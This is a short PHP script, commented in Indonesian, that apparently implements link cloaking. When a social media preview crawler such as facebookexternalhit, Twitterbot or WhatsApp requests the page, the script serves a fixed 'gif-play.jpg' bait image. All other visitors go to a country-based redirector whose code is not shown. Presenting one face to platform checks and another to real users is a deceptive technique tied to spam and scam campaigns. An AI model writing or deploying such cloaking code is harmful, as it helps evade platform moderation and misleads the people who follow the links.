<?php
require_once(__DIR__ . "/CountryRedirector.php");

// $_SERVER['HTTP_USER_AGENT'] = "facebookexternalhit";
// $_SERVER['HTTP_CF_IPCOUNTRY'] = '';
// print_r($_SERVER);

// Ambil User-Agent dari request
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
// Cek apakah user agent adalah dari media sosial
if (isSocialMediaUserAgent($userAgent)) {
    // require_once(__DIR__ . "/page.html");
    header('Content-Type: image/jpeg');
    readfile(__DIR__ . "/gif-play.jpg");
    die();
}

// Execute the redirector
(new CountryRedirector())->getRedirectLink();




function isSocialMediaUserAgent($userAgent)
{
    // Daftar kata kunci user agent dari aplikasi media sosial
    $socialMediaAgents = [
        'facebookexternalhit', // Facebook
        'Facebot',             // Facebook Bot
        'Twitterbot',          // Twitter
        'Pinterest',           // Pinterest
        'LinkedInBot',         // LinkedIn
        'WhatsApp',            // WhatsApp
        'Instagram',           // Instagram
        'TelegramBot',         // Telegram
    ];

    // Periksa apakah salah satu kata kunci ada dalam user agent
    foreach ($socialMediaAgents as $agent) {
        if (stripos($userAgent, $agent) !== false) {
            return true;
        }
    }
    return false;
}
